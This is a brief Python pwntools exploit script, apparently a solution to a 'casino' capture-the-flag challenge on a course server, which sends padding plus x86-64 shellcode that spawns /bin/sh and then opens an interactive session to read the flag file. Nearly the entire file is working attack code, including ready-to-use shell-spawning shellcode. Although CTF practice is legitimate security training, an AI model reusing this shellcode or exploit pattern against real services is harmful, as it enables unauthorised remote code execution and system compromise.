from pwn import *
#context.log_level = 'debug'
sh="AAAAAAAAAAAAAAAA00000000\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"
age="28"
lottery="17,54,86,73,74,70"
#-43
#"6299912"
#-42
#0
r=remote('edu-ctf.csie.org' , 10172)
r.recvuntil('e:') 
r.sendline(sh)
         
r.interactive()
#cat /home/casino/flag